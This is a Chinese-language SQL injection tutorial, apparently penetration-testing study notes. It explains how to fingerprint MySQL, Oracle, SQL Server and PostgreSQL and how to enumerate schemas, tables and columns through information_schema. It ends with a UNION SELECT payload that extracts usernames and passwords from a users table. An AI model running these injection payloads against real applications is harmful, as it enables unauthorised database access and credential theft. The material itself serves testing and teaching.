## 了解数据库

尽管 SQL 语言是标准，但每个 DBMS 都有其特殊性，在许多方面有所不同，例如特殊命令、检索数据（如用户名和数据库）、功能、注释行等。

当测试人员转向更高级的 SQL 注入利用时，获取数据库类型及其结构的信息很有用（如表名和字段名）

此处主要以 UNION 查询作为示例，而以下所有这些技术在经典和盲注入中均可行。

### 指纹识别数据库

#### 观察应用程序返回的错误

- MySql：

    ```log
    You have an error in your SQL syntax; check the manual
    that corresponds to your MySQL server version for the
    right syntax to use near '\'' at line 1
    ```

- Oracle：

    ```log
    ORA-00933: SQL command not properly ended
    ```

- MS SQL Server：

    ```log
    Microsoft SQL Native Client error ‘80040e14’
    Unclosed quotation mark after the character string
    ```

- PostgreSQL：

    ```log
    Query failed: ERROR: syntax error at or near
    '’' at character 56 in /www/site/test.php on line 121.
    ```

#### 提取数据库版本字符串

在 UNION SELECT 语句中使用内置函数如 `[version()|@@version]`、`user()` 和 `database()` 来枚举数据库的详细信息（数据库名称和版本）。

```sql
SELECT * FROM users WHERE id=-1 UNION SELECT version(), database()-- LIMIT 0,1;
```

查询版本类型的一些命令：
- MySql：
    `version()` 或 `@@version`
- Microsoft SQL Server：
    `@@version`
- Oracle：
    `SELECT BANNER FROM v$version`
- PostgreSQL：
    `version()`

#### 使用数据库特性识别

如果没有错误消息或出现自定义错误消息，测试人员可以尝试使用不同的拼接技术将注入插入字符串字段：

- MySql：`'test' + 'ing'`
- Microsoft SQL Server：`'test' 'ing'`
- Oracle：`'test'||'ing'`
- PostgreSQL：`'test'||'ing'`

如果注入数字数据，则可以使用下面的攻击字符串来识别数据库。每个数据项在目标数据库中的求值结果为0，在其他数据库中则会导致错误。

- Oracle：`BITAND(1,1)-BITAND(1,1)`
- MS-SQL：`@@PACK_RECEIVED-@@PACK_RECEIVED`
- MySQL：`CONNECTION_ID()-CONNECTION_ID()`

在识别数据库时，MySQL 如何处理某些行内注释（inline comment）也是一个值得关注的问题。如果一个注释以感叹号开头，接着是数据库版本字符串，那么只要数据库的实际版本等于或高于那个字符串，应用程序就会将注释内容解释为 SQL；否则，应用程序就会忽略注释内容，将它作为注释处理。与C中的预处理指令类似，程序员也可以对这一点加以利用，编写出根据所使用的数据库版本进行处理的不同代码。攻击者还可以利用它来识别数据库的实际版本。例如，如果使用的 MySQL 版本高于或等于 `3.23.02`，注入下面的字符串将使 SELECT 语句的 WHERE 子句为假：
- `/*!32302 and 1=0*/`

### 提取数据库信息

要检索更多详细信息，需要识别数据库名称和表，然后从这些表中提取数据。MySQL 与许多其他数据库，均支持一个名为 `information_schema` 的只读数据库，其中包含表名、列名以及所有其他数据库的权限的元数据。对此信息的访问基于每个 MySQL 用户的权限，这些权限决定了他们可以访问的表。通常，在分析大型数据库以探查攻击目标时，最好是查找有用的列名称，而不是表。

> Oracle并不支持该方案。对Oracle数据库实施攻击时，攻击方法在其他各方面可能完全相同。但是，需要使用查询`SELECT table_name,column_name FROM all_tab_columns`来检索有关数据库表和列的信息。（使用`user_tab_columns`表以仅针对当前数据库。）

`information_schema` 包含几个提供关于数据库、表和列信息的表，用于检索数据：

- `information_schema.schemata`：
    此表包含 MySQL 服务器上所有数据库的列表（包含数据库，条目少）。

- `information_schema.tables`：
    此表存储数据库中的表名（包含数据库、表，条目较多）。

- `information_schema.columns`：
    此表维护所有数据库中每个表的列名（包含数据库、表、列，条目更多）。

即，理论上可使用去重语句 `SELECT DISTINCT` 从头到尾都只查找 `information_schema.columns` 获取所有关键信息（`TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE`）。唯一的区别似乎仅在于性能（查询时长，应用程序也可能按照运行时间进行拦截），否则可作为特定表过滤的绕过方式

步骤
1. 使用 `ORDER BY` 探测列数
2. 使用 `UNION SELECT NULL` 探测列中的字符串类型
3. 查询元数据表`information_schema.schemata`，锁定目标数据库名
4. 查询元数据表`information_schema.columns`，锁定目标数据库中的表和列名
5. 使用得到的目标表与列名提取数据

#### 从 schemata 表列出所有数据库（或可省略）

现在我们已经对数据库进行了指纹识别，下一步是枚举当前用户可访问的所有数据库。如果用户具有 root 权限，则可以包含所有数据库。

`information_schema.schemata` 包含所有数据库的列表。

从 `information_schema` 数据库中的 `schemata` 表中，查询保存所有数据库名称的 `schema_name` 列：

```sql
UNION SELECT schema_name FROM information_schema.schemata-- 
```

#### 从 tables 表列出特定数据库的表（或列出所有表）

从假定数据库 `security` 中提取所有表：

```sql
UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='security'-- 
```
- `table_schema` 数据库名
- `table_name` 表名

若查询只返回一行，使用 `GROUP_CONCAT` 将多个值连接成一行。

#### 从 columns 表列出特定表的列

查询 `users` 表中的列名：

```sql
UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- 
```
- `column_name` 列名

#### 从列中提取数据

在表 `users` 中，提取 `username` 和 `password` 列中的数据：

**查询**
```sql
UNION SELECT group_concat(username,0x3a,password) FROM users-- 
```

注意：`0x3a` 是 `:` 的十六进制等效值。
